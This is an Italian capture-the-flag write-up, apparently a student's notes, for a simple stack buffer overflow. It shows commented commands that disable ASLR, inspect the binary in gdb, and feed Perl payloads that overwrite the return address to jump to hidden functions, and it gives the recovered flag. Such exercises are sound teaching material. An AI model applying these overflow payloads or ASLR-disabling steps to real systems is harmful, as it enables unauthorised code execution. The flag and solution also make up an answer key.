# Con i privilegi di root ho reso eseguibile il codice e ho disabilitato 
#la funzionalitÃ  randomizzazione della memoria con il comando

echo 0 > /proc/sys/kernel/randomize_va_space

#ho lanciato l'eseguibile con gdb
gdb es

###all'interno del debugger gdb
#per guardare gli indirizzi di memoria e il loro contenuto 
disas main
#eseguo un run di prova
run
#per trovare l'elenco delle funzioni ed individuare la possibile funzione  vulnerabile 
info functions #Noto che ci sono diverse funzioni con il nome secret
info function secret

trovo diverse funzioni di nome 
0x565561c9  secret_function_maybe
0x565562f2  secret_function_maybe_flag
0x56556442  secret_function_not
0x5655658f  secret_function_rr


#quindi presumo che all'interno di una di esse si possa trovare la flag
#provo per tentativi e scopro che riesco a sovrascrivere l'inizio  dell'indirizzo di ritorno dando #20 caratteri
run $(perl -e 'print "A"x16, "EDCB"')

#Ora provo a utilizzare l'indirizzo delle funzioni vulnerabili come indirizzo di ritorno
#i payload quindi diventano
run $(perl -e 'print "A"x16, "\xc9\x61\x55\x56"')
run $(perl -e 'print "A"x16, "\xf2\x62\x55\x56"')
run $(perl -e 'print "A"x16, "\x42\x64\x55\x56"')
run $(perl -e 'print "A"x16, "\x8f\x65\x55\x56"')


#Il payload finale risulta essere: run $(perl -e 'print "A"x16, "\x42\x64\x55\x56"')
#trovo la flag all'interno di secret_function_not
SEC{simple_buffer_overflow_with_secret_7unction}
